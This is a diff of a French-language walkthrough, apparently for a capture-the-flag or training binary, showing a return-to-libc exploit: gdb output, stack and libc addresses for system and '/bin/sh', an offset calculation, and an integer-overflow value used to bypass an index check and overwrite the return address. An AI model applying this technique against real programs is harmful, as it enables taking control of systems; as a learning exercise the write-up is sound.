@@ -10,14 +10,19 @@ word32 read_number(uint32 dwArg04[])
     Eq_118 eax_14 = get_unum();
     printf(" Number at data[%u] is %u\n", eax_14, dwArg04[eax_14]);
     return 0x00;
-}```
+}
+```
 
 on met donc un breakpoint sur l'appel a `read_number`
-```=> 0x0804892b <+520>:   call   0x80486d7 <read_number>
+
+```
+=> 0x0804892b <+520>:   call   0x80486d7 <read_number>
 ```
 
 On voit que son paramètre est placé sur `eax` juste avant l'appel
-```   0x08048928 <+517>:   mov    %eax,(%esp)``` 
+```   
+0x08048928 <+517>:   mov    %eax,(%esp)
+``` 
 on récupere donc l'adresse de `eax`
 ```(gdb) x $eax
 0xffffd544:     0x00000000
@@ -36,9 +41,15 @@ Stack level 0, frame at 0xffffd710:
 on a donc l'adresse du buffer: `0xffffd544`
 et l'adresse de `eip`: `0xffffd70c`
 
+system: 0xf7e6aed0 = 4159090384
+/bin/sh: 0xf7f897ec = 4160264172
+
 `0xffffd70c` - `0xffffd520` = `0x1EC`, donc `456` en décimal.
 Vu que notre buffer contient des `uint`, on divise par `4` (taille d'un uint) et on obtient l'offset:
 `456` / `4` = `114`
+
+Le problème est que `114` % `3` = `0`, on ne peut donc pas stocker de nombre directement à cet index.
+Pour contourner ce problème, j'avais essayé avec un underflow et ça n'avais pas marché, j'ai rééssayé avec un overflow et va savoir pourquoi cette fois ça marche
 
 On va donc mettre notre appel à `system` à l'index `114` en utilisant un overflow avec le nombre `1073741938`, et l'argument `/bin/sh` à l'index `116` (l'index `115` contenant la return address de system si on suit la logique du [tuto](<https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc>), mais on s'en fout apparemment, j'ai essayé de mettre plusieurs trucs différent ça change rien)
 
